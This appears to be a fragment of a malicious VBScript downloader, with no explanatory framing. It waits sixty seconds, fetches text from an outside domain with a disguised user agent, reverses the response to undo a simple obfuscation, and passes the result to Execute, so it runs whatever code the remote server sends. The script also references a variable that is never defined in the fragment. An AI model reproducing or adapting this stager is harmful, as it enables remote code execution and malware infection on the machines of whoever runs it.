URL="http://lastgoltda.info/?c=r&" & QhaS9
set Isbox=CreateObject("Msxml2.xmlhttp")
WScript.Sleep 60000
Isbox.open "GET",URL,false
Isbox.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
Isbox.setRequestHeader "User-Agent", "RemoveIT"
Isbox.send "Z"
WScript.Sleep 60000
For i = Len(Isbox.responsetext) to 1  Step-1
    var= Mid(Isbox.responsetext,  i  , 1)
    OQjhD = OQjhD & var
Next

execute "Execute OQjhD & QhaS9Isbox"
